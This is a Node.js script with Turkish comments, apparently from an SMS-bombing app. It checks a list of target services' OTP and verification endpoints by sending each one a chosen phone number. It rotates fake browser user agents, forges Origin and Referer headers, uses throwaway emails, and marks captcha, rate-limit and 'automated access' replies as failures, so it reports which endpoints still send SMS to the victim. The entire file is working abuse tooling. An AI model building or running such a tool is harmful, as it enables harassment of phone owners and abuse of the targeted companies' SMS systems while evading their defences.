// verify-endpoints.mjs  —  Node 18+
// node verify-endpoints.mjs --phone=5343622375
// node verify-endpoints.mjs --phone=5343622375 --fallback
// node verify-endpoints.mjs --only=koton,teb --delay=2000
import { readFileSync, writeFileSync } from 'node:fs';

const args = Object.fromEntries(
  process.argv.slice(2).map(a => {
    const [k, v] = a.replace(/^--/, '').split('=');
    return [k, v ?? true];
  })
);

const PHONE   = String(args.phone || '5343622375').replace(/\D/g, '');
const DELAY   = Number(args.delay ?? 1200);
const TIMEOUT = Number(args.timeout ?? 10000);
const ONLY    = args.only ? String(args.only).split(',').map(s => s.trim()) : null;
const FALLBACK = Boolean(args.fallback);

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
];
const pick = a => a[Math.floor(Math.random() * a.length)];
const sleep = ms => new Promise(r => setTimeout(r, ms));
const randEmail = () => Math.random().toString(36).slice(2, 12) + '@mailinator.com';

// ---- constants.ts -> obje listesi (tek dogruluk kaynagi) ----
function loadEndpoints() {
  const src = readFileSync(new URL('./constants.ts', import.meta.url), 'utf8');
  const at = src.indexOf('TARGET_ENDPOINTS');
  if (at < 0) throw new Error('constants.ts icinde TARGET_ENDPOINTS bulunamadi');
  const open = src.indexOf('[', at);
  const close = src.indexOf('\n];', open);
  const body = src.slice(open + 1, close);
  return body
    .split(/\n {2}\{/)
    .slice(1)
    .map(chunk => new Function('return (' + '{' + chunk.replace(/,\s*$/, '') + ')' + ')')());
}

// ---- app'in interpolatePhone() mantiginin aynisi ----
function interpolate(schema, phone, email) {
  let s = JSON.stringify(schema);
  s = s.replace(/\+905XXXXXXXXX/g, `+90${phone}`);
  s = s.replace(/905XXXXXXXXX/g, `90${phone}`);
  s = s.replace(/05XXXXXXXXX/g, `0${phone}`);
  s = s.replace(/5XXXXXXXXX/g, phone);
  s = s.replace(/\{\{PHONE\}\}/g, phone);
  s = s.replace(/\{\{EMAIL\}\}/g, email);
  return JSON.parse(s);
}

// ---- app'in isGenuineSuccess() mantigi: UI'da ne gorunecegini gosterir ----
const HARD_FAIL = [
  '"issuccessful":false', '"smsrequired":false', '"success":false', '"iserror":true',
  'otomatik erisim', 'yeni sürüm gerekli', 'yeni surum gerekli',
  'ust üste cok fazla istek', 'cok fazla istek', 'lutfen 1 dakika',
  'gecersiz istek imzasi', 'geçersiz istek imzası', 'captcha',
];
const looksGenuine = body => !HARD_FAIL.some(p => body.toLowerCase().includes(p));

async function fire(ep, payload) {
  const origin = new URL(ep.url).origin;
  const headers = {
    'User-Agent': pick(UAS),
    Accept: 'application/json, text/plain, */*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/json',
    'Cache-Control': 'no-cache',
    Origin: origin,
    Referer: origin + '/',
    ...(ep.headers || {}),
  };
  const method = ep.method || 'POST';
  const t0 = Date.now();
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), TIMEOUT);
    const res = await fetch(ep.url, {
      method,
      headers,
      body: method === 'GET' ? undefined : JSON.stringify(payload),
      signal: ctrl.signal,
      redirect: 'follow',
    });
    clearTimeout(timer);
    const body = (await res.text()).slice(0, 200);
    return { status: res.status, body, ms: Date.now() - t0, err: '' };
  } catch (e) {
    return { status: 0, body: '', ms: Date.now() - t0, err: e.name === 'AbortError' ? 'TIMEOUT' : (e.cause?.code || e.message) };
  }
}

const endpoints = loadEndpoints();
const results = [];
let ok = 0, warn = 0, bad = 0;

console.log(`\n${endpoints.length} endpoint test ediliyor — telefon: ${PHONE}\n`);
console.log('DURUM     | KOD | MS   | STRATEJI        | SERVIS');
console.log('--------- | --- | ---- | --------------- | ------------------------------');

for (const ep of endpoints) {
  if (ONLY && !ONLY.includes(ep.id)) continue;

  const payload = interpolate(ep.payloadInfo ? JSON.parse(ep.payloadInfo) : { phone: PHONE }, PHONE, randEmail());
  let r = await fire(ep, payload);
  let strategy = 'direct';

  // App'teki bare_phone fallback'ini taklit et
  if (FALLBACK && r.status >= 400 && r.status < 500) {
    await sleep(400);
    const r2 = await fire(ep, { phone: PHONE });
    if (r2.status >= 200 && r2.status < 300) { r = r2; strategy = 'bare_phone'; }
  }

  const isHtml = r.body.trimStart().startsWith('<');
  let verdict;
  if (r.status === 0) verdict = 'DEAD';
  else if (r.status === 429) verdict = 'RATE';
  else if (r.status >= 200 && r.status < 300 && !isHtml && looksGenuine(r.body)) verdict = 'OK';
  else if (r.status >= 200 && r.status < 300) verdict = '200-OPAQUE';
  else verdict = 'FAIL';

  if (verdict === 'OK') ok++;
  else if (verdict === '200-OPAQUE' || verdict === 'RATE') warn++;
  else bad++;

  console.log(
    `${verdict.padEnd(9)} | ${String(r.status).padEnd(3)} | ${String(r.ms).padEnd(4)} | ${strategy.padEnd(15)} | ${ep.id}`
  );
  if (verdict !== 'OK' && (r.err || r.body)) {
    console.log(`          > ${(r.err || r.body.replace(/\s+/g, ' ')).slice(0, 120)}`);
  }

  results.push({ id: ep.id, url: ep.url, verdict, status: r.status, ms: r.ms, strategy, err: r.err, body: r.body });
  await sleep(DELAY);
}

writeFileSync(new URL('./verify-results.json', import.meta.url), JSON.stringify(results, null, 2));
console.log(`\nOK: ${ok} | 200-OPAQUE/RATE: ${warn} | FAIL/DEAD: ${bad}`);
console.log('Detay: verify-results.json\n');
process.exit(bad > 0 ? 1 : 0);
